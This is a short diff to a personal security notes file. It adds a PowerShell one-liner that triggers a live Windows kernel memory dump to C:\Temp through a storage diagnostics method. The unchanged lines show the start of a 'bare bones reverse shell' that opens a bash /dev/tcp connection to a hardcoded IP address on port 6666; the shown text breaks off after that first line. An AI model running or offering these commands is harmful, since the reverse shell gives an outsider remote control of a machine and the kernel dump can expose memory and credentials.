@@ -1,5 +1,11 @@
 # notes 
 
+### Live dump Windows kernel with Grzegorz Tworek @0gtweet
+
+````
+$ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage; Invoke-CimMethod -InputObject $ss -MethodName "GetDiagnosticInfo" -Arguments @{DestinationPath="C:\Temp"; IncludeLiveDump=$true}
+````
+
 ### @nthcolumn with the bare bones reverse shell
 ````
 exec 5<>/dev/tcp/194.26.29.6/6666
